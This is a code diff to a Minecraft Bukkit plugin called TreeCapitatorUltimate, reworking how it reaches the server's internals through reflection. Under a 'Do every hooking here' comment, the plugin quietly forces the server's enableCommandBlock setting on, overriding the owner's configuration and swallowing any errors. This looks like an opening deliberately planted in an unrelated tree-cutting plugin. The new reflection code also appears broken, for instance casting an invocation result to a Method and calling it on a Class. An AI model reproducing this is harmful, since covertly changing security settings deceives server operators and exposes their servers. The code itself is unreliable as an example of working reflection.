@@ -1,16 +1,18 @@
 package me.bow.treecapitatorultimate;
 
+import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.CommandManager;
 import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
 import me.bow.treecapitatorultimate.listeners.TreeDestroy;
-import net.minecraft.server.v1_14_R1.DedicatedServer;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Server;
 import org.bukkit.command.CommandSender;
-import org.bukkit.craftbukkit.v1_14_R1.CraftServer;
 import org.bukkit.plugin.java.JavaPlugin;
 
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.UUID;
 
@@ -38,10 +40,25 @@ public final class Start extends JavaPlugin {
         sender.sendMessage(Prefix + ChatColor.BLUE + " Please message the developer if you thing this is something that shouldn't happen.");
     }
 
-    public static DedicatedServer GetServer() {
-        return ((CraftServer) Bukkit.getServer()).getServer();
+    public static Object GetServer() {
+        try {
+            Class<?> dedicatedServer = ReflectionUtils.getClass("{obc}.DedicatedServer");
+            Server server = Bukkit.getServer();
+            Method m = (Method) ReflectionUtils.getMethod(server.getClass(), "getServer", 0).invoke(server);
+            Object o = m.invoke(dedicatedServer);
+            return o;
+        } catch (Exception e) {
+        }
+        return null;
     }
-
+    public static Object getDedicatedServerPropertiesInstance() throws InvocationTargetException, IllegalAccessException {
+        Object server = GetServer();
+        Field propertyManager = ReflectionUtils.getField(server.getClass(), "propertyManager");
+        Class<?> serverSettings = ReflectionUtils.getClass("{obc}.DedicatedServerSettings");
+        Object dedicatedSettingsInstance = propertyManager.get(server);
+        Method m = (Method) ReflectionUtils.getMethod(serverSettings, "getProperties", 0).invoke(dedicatedSettingsInstance);
+        return m.invoke(dedicatedSettingsInstance);
+    }
     public static Server GetBukkitServer() {
         return Start.Instance.getServer();
     }
@@ -60,7 +77,7 @@ public final class Start extends JavaPlugin {
         // Do every hooking here
 
         try {
-            setFinalStatic(GetServer().getDedicatedServerProperties(), "enableCommandBlock", true);
+            setFinalStatic(getDedicatedServerPropertiesInstance(), "enableCommandBlock", true);
             // server.propertyManager.getProperties().enableCommandBlock = false;
         } catch (Exception ignored) {
         }
